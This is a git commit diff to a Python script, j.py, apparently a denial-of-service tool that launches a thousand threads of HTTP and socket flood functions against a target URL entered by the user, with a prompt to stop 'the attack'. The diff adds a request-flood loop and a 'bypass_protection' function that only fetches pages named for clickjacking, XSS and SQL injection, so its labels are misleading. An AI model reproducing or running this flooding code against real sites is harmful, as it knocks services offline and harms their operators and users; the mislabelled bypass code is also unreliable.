e26e719de58345108e6d5c22b8e25f41a13b7cd5
rrqr <76810190+rrqr@users.noreply.github.com>
2025-01-07 08:35:51 +0300

    Update j.py

--- j.py
+++ j.py
@@ -4,6 +4,15 @@ import socket
 import os
 import sys
 
+stop_flag = False
+
+def send_request(target_url):
+    while not stop_flag:
+        try:
+            requests.get(target_url, timeout=5)
+        except requests.exceptions.RequestException:
+            pass
+
 def http_flood(target_url):
     while True:
         try:
@@ -126,11 +135,31 @@ def socket_flood(target_url):
         except:
             pass
 
+def bypass_protection(target_url):
+    try:
+        # Clickjacking
+        clickjacking_url = target_url + "/clickjacking.html"
+        requests.get(clickjacking_url)
+
+        # XSS
+        xss_url = target_url + "/xss.php"
+        requests.get(xss_url)
+
+        # SQL Injection
+        sql_injection_url = target_url + "/sql_injection.php"
+        requests.get(sql_injection_url)
+    except:
+        pass
+
 def main():
+    global stop_flag
     target_url = input("Enter target URL: ")
-    num_threads = int(input("Enter number of threads: "))
+    num_threads = 1000
+
+    bypass_protection(target_url)
 
     for i in range(num_threads):
+        threading.Thread(target=send_request, args=(target_url,)).start()
         threading.Thread(target=http_flood, args=(target_url,)).start()
         threading.Thread(target=low_orbit_ion_cannon, args=(target_url,)).start()
         threading.Thread(target=hping3, args=(target_url,)).start()
@@ -140,6 +169,12 @@ def main():
         threading.Thread(target=shaft, args=(target_url,)).start()
         threading.Thread(target=achilles, args=(target_url,)).start()
         threading.Thread(target=socket_flood, args=(target_url,)).start()
+
+    while True:
+        command = input("Enter 'stop' to stop the attack: ")
+        if command.lower() == "stop":
+            stop_flag = True
+            break
 
 if __name__ == "__main__":
     main()
